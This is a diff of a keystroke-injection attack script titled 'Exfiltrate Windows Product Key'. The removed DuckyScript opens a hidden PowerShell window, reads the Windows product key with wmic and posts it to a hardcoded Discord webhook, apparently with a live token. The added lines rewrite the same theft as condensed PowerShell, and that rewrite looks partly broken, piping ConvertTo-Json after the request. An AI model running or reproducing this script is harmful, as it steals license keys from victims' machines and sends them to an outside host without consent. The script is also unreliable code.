@@ -1,35 +1,4 @@
-REM ###################################################
-REM #                                                 #
-REM # Title        : Exfiltrate Windows Product Key   #
-REM # Author       : Aleff (Modified by NazarHK)      #
-REM # Version      : 1.1                              #
-REM # Target       : Windows 10-11                    #
-REM #                                                 #
-REM ###################################################
-
-DELAY 2000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden
-ENTER
-DELAY 1000
-STRING $hookUrl = "https://discord.com/api/webhooks/1322635423369003129/Z0eJb-VnYmu33ZOYHl6ESyQybDtgZ4ODMgbV22ifsRivbQr8UZlhlISrv9O9_h8sRf3K"
-ENTER
-DELAY 500
-STRING $productKey = (wmic path softwarelicensingservice get OA3xOriginalProductKey | ForEach-Object { $_.Trim() }) -join ""
-ENTER
-DELAY 500
-STRING if (!$productKey) { $productKey = "No product key found." }
-ENTER
-DELAY 500
-STRING $exfiltration = "ProductKey: $productKey"
-ENTER
-DELAY 500
-STRING $payload = @{content = $exfiltration} | ConvertTo-Json -Depth 1
-ENTER
-DELAY 500
-STRING try { Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType 'Application/Json' } catch { }
-ENTER
-DELAY 500
-STRING exit
-ENTER
+$u = 'https://discord.com/api/webhooks/1322635423369003129/Z0eJb-VnYmu33ZOYHl6ESyQybDtgZ4ODMgbV22ifsRivbQr8UZlhlISrv9O9_h8sRf3K'
+$k = (wmic path softwarelicensingservice get OA3xOriginalProductKey | Select-String -Pattern '\w{5}-\w{5}-\w{5}-\w{5}-\w{5}' | foreach { $_.Matches.Value }) -join ''
+$k = [string]::IsNullOrEmpty($k) ? 'No key' : $k
+irm -Uri $u -Method Post -Body @{content=$k} | ConvertTo-Json -Depth 1
